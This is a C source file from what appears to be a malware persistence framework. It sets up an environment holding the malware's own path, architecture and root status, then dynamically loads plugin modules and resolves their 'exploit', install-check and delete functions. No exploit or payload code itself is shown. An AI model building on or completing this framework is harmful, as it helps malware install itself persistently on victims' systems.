#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "../../headers/library/percistency_hub.h"
#include "../../headers/helpers/helpers.h"
#include "../../headers/errors.h"

#pragma region Environment

int set_environment(ENVIRONMENT **env, OPERATING_SYSTEM os, ARCHITECTURE arch, ROOTED_STATE is_root, const char *abs_path_to_malware){

	int error;

	// Allocate the ENVIRONMENT object
	if (*env != NULL)
		free(*env);
	*env = (ENVIRONMENT *)calloc(1, sizeof(ENVIRONMENT));
	if (env == NULL)
		return ERROR_OPERAING_SYSTEM_UNABLE_TO_ALLOCATE;

	// Copy the object members
	(*env)->operating_system = os;
	(*env)->architecture = arch;
	(*env)->is_root = is_root;

	// Copy the malware path
	error = copy_string(&(*env)->malware_path, abs_path_to_malware, 0);
	if (error != 0)
		return error;

	// Copy the parent path
	error = copy_string(&(*env)->working_directory, abs_path_to_malware, 0);
	if (error != 0)
		return error;
	get_parent_folder_path((*env)->working_directory);

	// Change directory
	change_working_directory((*env)->working_directory);

	// Return
	return 0;

}

int autoset_environment(ENVIRONMENT **env, const char *abs_path_to_malware){

	ARCHITECTURE arch;
	ROOTED_STATE is_root;
	int is_error;

	// Get architecture
	is_error = get_system_details(ARCHITECTURE_BITS, &arch);
	if (is_error != 0)
		return is_error;

	// Check root
	is_error = get_system_details(ROOT_CHECK, &is_root);
	if (is_error != 0)
		return is_error;

	// Init the environment
	return set_environment(env, TARGET_OPERAING_SYSTEM, arch, is_root, abs_path_to_malware);

}

int free_environment(ENVIRONMENT **env){

	// Free members and objects
	if (*env != NULL){
		free((*env)->malware_path);
		free((*env)->working_directory);
		free(*env);
		*env = NULL;
	}

	// Return
	return 0;

}

#pragma endregion

#pragma region ModuleWallet

int get_all_modules(MODULE_WALLET **wallet){

	char *extension_ptr;
	int i, is_error;

	// Allocate the wallet
	if (*wallet != NULL){
		free(*wallet);
	}
	*wallet = (MODULE_WALLET *)calloc(1, sizeof(MODULE_WALLET));

	// Get all filenames
	is_error = get_all_files_from_folder(MODULES_FOLDER, &(*wallet)->count, &(*wallet)->names, MAX_MODULES);
	if (is_error != 0)
		return is_error;

	// Process the filenames
	for (i = 0; i < (*wallet)->count; i++){
		extension_ptr = strstr(((*wallet)->names)[i], MODULE_EXTENSION);
		if (extension_ptr != NULL)
			*extension_ptr = '\0';
	}

	// Return
	return 0;

}

int free_module_wallet(MODULE_WALLET **wallet){

	int i;

	if (*wallet != NULL){
		for (i = 0; i < MAX_MODULES; i++){
			free((*wallet)->names[i]);
		}
		free((*wallet)->names);
		free(*wallet);
		*wallet = NULL;
	}

	// Return
	return 0;

}

#pragma endregion

#pragma region Module

int is_module_present(MODULE_WALLET *wallet, const char *name){

	int i;

	// Check arguments
	if (wallet == NULL || name == NULL)
		return ERROR_PROGRAMMING_INVALID_ARGUMENT;

	// Iterate the wallet
	for (i = 0; i < wallet->count; i++){
		if (strcmp(wallet->names[i], name) == 0)
			return i;
	}

	// Return
	return ERROR_MODULE_MANAGER_NOT_FOUND;

}

int load_module(LOADED_MODULE **module, const char *name){

	int error;

	// Allocate the module
	if (*module != NULL)
		free(*module);
	*module = (LOADED_MODULE *)calloc(1, sizeof(LOADED_MODULE));

	// Copy the name and add extension
	error = copy_string(&(*module)->name, name, 3);
	if (error != 0)
		return error;
	strcat((*module)->name, MODULE_EXTENSION);

	// Load module
	error = load_library((*module)->name, &(*module)->handle);
	if (error != 0)
		return error;

	// Get function pointers
	error = get_function_pointer((*module)->handle, FUNC_NAME_IS_COMPATIBLE, &(*module)->is_compatible);
	if (error != 0)
		return error;
	error = get_function_pointer((*module)->handle, FUNC_NAME_EXPLOIT, &(*module)->exploit);
	if (error != 0)
		return error;
	error = get_function_pointer((*module)->handle, FUNC_NAME_IS_INSTALLED, &(*module)->is_installed);
	if (error != 0)
		return error;
	error = get_function_pointer((*module)->handle, FUNC_NAME_DELETE_INSTALLED, &(*module)->delete_installed);
	if (error != 0)
		return error;

	// Return
	return 0;

}

int unlink_module(LOADED_MODULE **module){

	// Unlink the handle
	unlink_library((*module)->handle);

	// Free
	free((*module)->name);
	free(*module);
	*module = NULL;

	// Return
	return 0;

}

#pragma endregion